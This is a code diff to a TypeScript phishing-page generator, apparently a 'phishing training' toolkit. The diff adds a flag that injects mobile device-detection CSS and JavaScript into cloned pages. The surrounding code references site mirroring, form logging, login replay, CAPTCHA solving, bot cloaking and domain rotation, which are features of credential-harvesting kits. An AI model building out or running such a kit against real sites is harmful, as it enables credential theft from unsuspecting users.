@@ -27,6 +27,7 @@
  *   --captcha-demo   with --mirror: write README-CAPTCHA-DEMO.md (2captcha education, no API)
  *   --rotate-domain  with --mirror: write README-ROTATE-DOMAIN.md + DuckDNS script template (manual)
  *   --auto-rotate    with --mirror: DuckDNS auto-rotation (rotate-domain.sh + domain-rotator service)
+ *   --mobile-optimize inject device-detection CSS/JS for better mobile clone layout
  *
  * Example:
  *   PHISHING_TRAINING_MODE=true pnpm exec tsx scripts/generate-phishing-page.ts \\
@@ -57,6 +58,8 @@ import {
   buildMirrorNginxConfig,
   buildMirrorReadme,
   buildMirrorStatusHtml,
+  buildMobileOptimizeCss,
+  buildMobileOptimizeJs,
   buildNginxProxyConfig,
   buildProxyClientPatch,
   buildTrainingQaCss,
@@ -99,6 +102,7 @@ const FEATURE_FLAGS = [
   'lang',
   'solve-captcha',
   'preapprove',
+  'mobile-optimize',
 ] as const
 
 function parseCli(argv: string[]): {
@@ -113,6 +117,7 @@ function parseCli(argv: string[]): {
   captchaDemo: boolean
   rotateDomain: boolean
   autoRotate: boolean
+  mobileOptimize: boolean
   positional: string[]
 } {
   const features: TrainingCloneFeatures = {
@@ -137,6 +142,7 @@ function parseCli(argv: string[]): {
   let captchaDemo = false
   let rotateDomain = false
   let autoRotate = false
+  let mobileOptimize = false
   const positional: string[] = []
 
   for (const arg of argv) {
@@ -156,6 +162,7 @@ function parseCli(argv: string[]): {
     else if (arg === '--captcha-demo') captchaDemo = true
     else if (arg === '--rotate-domain') rotateDomain = true
     else if (arg === '--auto-rotate') autoRotate = true
+    else if (arg === '--mobile-optimize') mobileOptimize = true
     else if (arg === '--proxy') features.proxy = true
     else if (arg === '--rotate') features.rotate = true
     else if (arg === '--deploy') features.deploy = true
@@ -184,6 +191,7 @@ function parseCli(argv: string[]): {
     captchaDemo,
     rotateDomain,
     autoRotate,
+    mobileOptimize,
     positional,
   }
 }
@@ -360,6 +368,7 @@ function buildInjectionBundle(opts: {
   qaContext: TrainingCloneContext | null
   proxy: boolean
   target: URL
+  mobileOptimize?: boolean
 }): string {
   const parts: string[] = []
   parts.push('<!-- legion-phishing-training (authorized staging / QA toolkit) -->')
@@ -373,6 +382,11 @@ function buildInjectionBundle(opts: {
 
   if (opts.proxy) {
     parts.push('<script src="./legion-proxy-patch.js"></script>')
+  }
+
+  if (opts.mobileOptimize) {
+    parts.push('<link rel="stylesheet" href="./legion-mobile-optimize.css" />')
+    parts.push('<script src="./legion-mobile-optimize.js" defer></script>')
   }
 
   return parts.join('\n')
@@ -519,6 +533,7 @@ async function generateMirrorMode(
   captchaDemo: boolean,
   rotateDomain: boolean,
   autoRotate: boolean,
+  mobileOptimize: boolean,
 ): Promise<void> {
   const hostPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
   const loggerPort = Number.parseInt(process.env['QA_MIRROR_LOGGER_PORT']?.trim() ?? '9090', 10)
@@ -620,22 +635,31 @@ async function generateMirrorMode(
     }),
     'utf8',
   )
-  await writeFile(
-    path.join(outDir, 'index.html'),
-    buildMirrorStatusHtml(
-      target,
-      logForms,
-      replayDemo,
-      captchaDemo,
-      rotateDomain,
-      testLogin,
-      mirrorSolveCaptcha,
-      autoRotate,
-      replayOriginal,
-      instantReplay,
-    ),
-    'utf8',
+  if (mobileOptimize) {
+    await writeFile(path.join(outDir, 'legion-mobile-optimize.css'), buildMobileOptimizeCss(), 'utf8')
+    await writeFile(path.join(outDir, 'legion-mobile-optimize.js'), buildMobileOptimizeJs(), 'utf8')
+  }
+
+  let mirrorHtml = buildMirrorStatusHtml(
+    target,
+    logForms,
+    replayDemo,
+    captchaDemo,
+    rotateDomain,
+    testLogin,
+    mirrorSolveCaptcha,
+    autoRotate,
+    replayOriginal,
+    instantReplay,
   )
+  if (mobileOptimize) {
+    const mobileBundle =
+      '<link rel="stylesheet" href="./legion-mobile-optimize.css" />\n<script src="./legion-mobile-optimize.js" defer></script>'
+    mirrorHtml = mirrorHtml.includes('</head>')
+      ? mirrorHtml.replace('</head>', `${mobileBundle}\n</head>`)
+      : `${mobileBundle}\n${mirrorHtml}`
+  }
+  await writeFile(path.join(outDir, 'index.html'), mirrorHtml, 'utf8')
 
   if (replayDemo) {
     await writeFile(
@@ -828,7 +852,7 @@ async function generateMirrorMode(
 async function main(): Promise<void> {
   guardOrExit()
 
-  const { features, mirror, logForms, testLogin, replayOriginal, instantReplay, mirrorSolveCaptcha, replayDemo, captchaDemo, rotateDomain, autoRotate, positional } =
+  const { features, mirror, logForms, testLogin, replayOriginal, instantReplay, mirrorSolveCaptcha, replayDemo, captchaDemo, rotateDomain, autoRotate, mobileOptimize, positional } =
     parseCli(process.argv.slice(2))
   const targetRaw = positional[0]?.trim()
   const outDirArg = positional[1]?.trim()
@@ -972,6 +996,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
       captchaDemo,
       rotateDomain,
       autoRotate,
+      mobileOptimize,
     )
     return
   }
@@ -1070,6 +1095,11 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     await writeFile(path.join(outDir, 'legion-training-qa.css'), buildTrainingQaCss(), 'utf8')
   }
 
+  if (mobileOptimize) {
+    await writeFile(path.join(outDir, 'legion-mobile-optimize.css'), buildMobileOptimizeCss(), 'utf8')
+    await writeFile(path.join(outDir, 'legion-mobile-optimize.js'), buildMobileOptimizeJs(), 'utf8')
+  }
+
   if (features.cloak) {
     await writeFile(path.join(outDir, 'bots.html'), buildBotsHtml(target), 'utf8')
   }
@@ -1086,6 +1116,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')}`)
     qaContext,
     proxy: features.proxy,
     target,
+    mobileOptimize,
   })
 
   if (html.includes('</body>')) {
